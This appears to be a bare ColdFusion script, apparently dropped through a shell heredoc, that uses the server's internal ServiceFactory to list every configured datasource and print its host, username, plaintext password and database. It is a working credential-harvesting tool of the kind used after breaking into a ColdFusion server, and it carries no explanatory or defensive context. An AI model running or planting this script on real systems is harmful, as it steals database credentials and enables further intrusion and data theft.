<cfset svc = createObject("java","coldfusion.server.ServiceFactory").getDataSourceService()>
  <cfset dsns = svc.getDatasources()>
  <cfloop collection="#dsns#" item="n">
  <cfset d = dsns[n]>
  <cfoutput>=== #n# ===
  host: <cfif isStruct(d.urlmap) and structKeyExists(d.urlmap,"host")>#d.urlmap.host#</cfif>
  user: #d.username#
  pass: #d.password#
  db: <cfif isStruct(d.urlmap) and structKeyExists(d.urlmap,"database")>#d.urlmap.database#</cfif>

  </cfoutput>
  </cfloop>
  EOF